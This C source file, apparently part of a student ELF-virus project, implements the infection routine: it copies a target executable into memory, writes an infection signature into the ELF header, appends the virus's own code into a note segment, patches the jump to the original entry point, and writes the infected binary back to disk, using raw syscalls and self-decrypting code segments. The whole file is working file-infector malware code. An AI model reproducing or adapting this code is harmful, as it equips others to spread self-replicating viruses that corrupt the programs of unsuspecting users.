/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/22 15:29:22 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

__INLINE__ static void	*_memcpy(void *d, void *s, size_t size)
{
	char *s1 = d;
	char *s2 = s;

	for (size_t n = 0 ; n < size ; n++)
		s1[n] = s2[n];
	return (s1);
}

__INLINE__ static void    *_mmap(void *addr, size_t len, int prot, size_t flags, size_t fd, off_t offset)
{
	void *ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov rsi, %1;"
		"mov edx, %2;"
		"mov r10, %3;"
		"mov r8, %4;"
		"mov r9, %5;"
		"mov rax, 9;"
		"syscall" :: "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(fd), "g"(offset)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return ((void*)ret);
}

__INLINE__ static int     _munmap(void *addr, size_t len)
{
	long ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov rsi, %1;"
		"mov rax, 11;"
		"syscall" :: "g"(addr), "g"(len)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return (ret);
}

__INLINE__ static int _write(int fd, const void *buf, size_t len)
{
	long ret;

	__asm__ __volatile__ (
		"mov edi, %0;"
		"mov rsi, %1;"
		"mov rdx, %2;"
		"mov rax, 1;"
		"syscall" :: "g"(fd), "g"(buf), "g"(len)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return (ret);
}

void		inject(t_data *data)
{
//	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	update_two(&data->key, (char*)inject, (size_t)release - (size_t)inject);

	if (data->context == false)
		goto ERR;

	data->context = false;
	int		size = data->virus.size + data->virus.note->p_offset;
	void	*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (map == MAP_FAILED)
		goto ERR;

	register int	off = 0;
	register int	lim = 0;
	uint8_t			*src = data->bin.map;
	uint8_t			*dst = map;

	// step 1 : copy
	lim = data->virus.data->p_offset + data->virus.data->p_filesz;
	while (off < lim)
	{
		*dst++ = *src++;
		off++;
	}

	// step 2 : insert signature
	data->header = (Elf64_Ehdr*)map;
	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;

	// step 3 : pad
	lim = data->virus.note->p_offset;
	while (off < lim)
	{
		*dst++ = 0;
		off++;
	}

	// step 4 : inject itself
	uint8_t *beg = (uint8_t*)start;
	for (register int i = 0 ; i < (int)data->virus.size ; i++)
	{
		*dst++ = *beg++;
		off++;
	}

	// step 5 : patch entrypoint
	dst -= ((size_t)end_of_data - (size_t)cypher_end);
	while (*dst != 0xe9)
		dst++;
	if ((void*)dst >= (void*)data->bin.map + data->bin.size)
		goto ERR;

	data->bin_entry = (data->bin_entry - data->vrs_entry - (data->virus.size - 729));
	if (_memcpy(dst + 1, &data->bin_entry, 4) != dst + 1)
		goto ERR;
	_write(data->bin.fd, map, size);
	data->context = true;

ERR:
	_munmap(map, size);
//	revert_two(&data->key, (char*)release, (size_t)cypher_end  - (size_t)release);
	release(data);
}
